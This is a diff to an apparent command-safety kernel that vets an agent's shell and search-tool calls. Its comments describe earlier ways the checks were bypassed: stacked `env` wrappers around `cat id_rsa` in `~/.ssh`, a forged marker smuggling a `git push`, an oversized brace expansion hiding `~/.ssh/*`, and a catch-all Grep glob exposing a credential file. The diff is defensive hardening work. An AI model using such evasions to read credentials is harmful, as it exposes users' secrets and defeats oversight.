+    // A CHAIN THE TABLE COULD NOT FOLLOW TO ITS END IS NOT A CHAIN THAT ENDS. Nine `env`s in front of `-C ~/.ssh cat id_rsa`
+    // once ended the walk silently and the command was judged in the directory the line started in (r11-233, r11-234); the
+    // cap itself says the directory is unproved, and the caller then proves nothing about a relative path
+    if (peeled.partial !== null) known = false;
     for (const step of peeled.steps) {
       if (step.carrier !== 'env') continue;
       if (step.unknown.length) known = false;
@@ -13683,9 +14135,11 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
       }
     }
     // an `env -S` string is env's OWN argv - its options, assignments and command - and env appends what follows it
-    if (depth < 8)
-      for (const str of peeled.strings)
-        if (str.carrier === 'env') walk(['env', ...tokenize(str.body), ...str.appended], depth + 1);
+    for (const str of peeled.strings)
+      if (str.carrier === 'env') {
+        if (depth < 8) walk(['env', ...tokenize(str.body), ...str.appended], depth + 1);
+        else known = false;
+      }
     if ((ws[peeled.at] ?? '').replace(/^.*\//, '') === 'git') {
       let i = peeled.at + 1;
       const t = GLOBAL_OPTIONS['git']!;
@@ -14137,6 +14591,9 @@ function analyzeSegments(
   // `normalizeSegment`. So mangling the sentinel here cannot destroy a real marker, and it makes a forged one
   // (`\0ego\0define-function git; git push origin main`) into what it actually is: an unknown command.
   segments = segments.map(externalText);
+  // WHETHER A WILDCARD MATCHES A NAME THAT BEGINS WITH A DOT is the shell's option, and a line may set it: bash `shopt -s
+  // dotglob` or any GLOBIGNORE, zsh `setopt glob_dots`. Read from the whole unit, because the option outlives the line it is on
+  const shellGlob = shellGlobOptions(segments);
   // TRANSITIVE FRESHNESS: the ledger belongs to the COMMAND, not to one producer, and is mutated in place. A copy
   // here is what made `./configure && make build` reuse the Makefile configure had just rewritten — the write
   // happened one level down and never came back out (challenge 6, findings 6, 13, 19).
@@ -14284,7 +14741,7 @@ function analyzeSegments(
     // scan, pathTokens, the short-flag cluster reader and every producer. The shell does it ahead of everything
     // else, so a reader given the unexpanded text is reading a word that will never exist (exit review 9).
     const braceOverflow = { hit: false };
-    const seg = substituteKnownVars(expandBraces(stage.text, braceOverflow), shellVars);
+    const seg = separateGluedRedirections(substituteKnownVars(expandBraces(stage.text, braceOverflow), shellVars));
     // WHAT IS BOUND HERE, and whether what THIS stage assigns or defines certainly takes place in the shell that goes on:
     // not inside a branch (`if`/`while`/`for`/`case`, `time if false`), a function body, a case arm (the splitter consumes
     // its header), either side of a pipe - a definition is the stage after the whole BODY of `git() { echo hi; } | cat` -,
@@ -14564,7 +15021,8 @@ function analyzeSegments(
         runDirectory(b, env.cwd) !== null ||
         commitBypassFlag(b) ||
         carrierPartialOf(b) !== null ||
-        (depth < 4 && carriedShellBodies(b).some((x) => needsReentry(expandBraces(x), depth + 1)));
+        // (a nest deeper than the walk goes is re-entered whole - more analysis, never less - rather than assumed to end)
+        carriedShellBodies(b).some((x) => depth >= 4 || needsReentry(expandBraces(x), depth + 1));
       if (needsReentry(body))
         for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
           hits.push({ ...h, via: `${h.via ?? ''} (carried by a shell carrier)`.trim() });
@@ -14713,6 +15171,7 @@ function analyzeSegments(
           written,
           seg,
           point.old,
+          shellGlob,
         ))
           hits.push(h);
     }
@@ -15207,12 +15666,18 @@ function searchToolHits(
   // A GLOB IS READ THE WAY THE SEARCH TOOL READS IT: braces are alternatives that may hold a slash (`{.env,src/x}`),
   // and a backslash escapes (`.en\\v` is `.env`) - so each alternative is classified on its own, unescaped
   // (exit review 10, self-attack)
+  // ...AND A BRACE EXPANSION THAT IS REFUSED IS REPORTED, exactly as the shell side reports it. More alternatives than the
+  // budget leaves the pattern LITERAL - one word with a brace in it - and the reach it spells (`{…64 names…,~/.ssh/*}`) was
+  // never classified: the tool surface ended the expansion silently where the Bash loop says so (r11-2)
+  const braceOverflow = { hit: false };
   const reaches = reach0
-    ? expandBraces(reach0)
+    ? expandBraces(reach0, braceOverflow)
         .split(/\s+/)
         .filter(Boolean)
         .map((r) => unquoteShellWord(r))
     : [];
+  if (braceOverflow.hit)
+    hits.push(opaqueHit(table, ctx, reach0, `${tool} pattern: a brace expansion produces more words than this kernel enumerates`));
   for (const abs of bases) {
     for (const reach of reaches) {
       // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
@@ -15279,6 +15744,25 @@ function searchToolHits(
                 }
               }
         }
+      }
+      // ...AND A CATCH-ALL TAIL NAMES EVERY NAME THERE IS. `*`, `**` and `?*` match `.env` as surely as `.env*` does, because an
+      // explicit glob overrides the tool's skip-hidden default: `Grep` with `glob: "*"` printed a credential file at ALLOW
+      // (r11-96). The static set above would ask for every `Glob "*"` there ever was, so a catch-all is judged by what is
+      // actually there: the tree below the base is read (bounded - a reached bound is a question) and every hidden or
+      // credential-named file the pattern matches is classified like the path it is.
+      const tailName = reach.split('/').filter(Boolean).pop() ?? '';
+      if (/^[*?]+$/.test(tailName)) {
+        const set = globMatches(abs, reach, undefined, { dotfiles: true, keep: (p) => credentialShaped(relative(abs, p)) });
+        if (set.bounded)
+          hits.push(unknownHit(table, ctx, `${tool} pattern ${reach} reaches more names than this kernel enumerates, so a credential file may be among them`));
+        for (const m of set.paths)
+          for (const probe of set.directories.has(m) ? [m, `${m}/`] : [m]) {
+            const g = classifyPath(table, ctx, 'Read', probe);
+            if (g.via.startsWith('matcher path') || g.capability.startsWith('fs.credential')) {
+              hits.push({ ...g, via: `${tool} pattern ${reach} reaches ${m} (${g.via})` });
+              break;
+            }
+          }
       }
     }
     if (
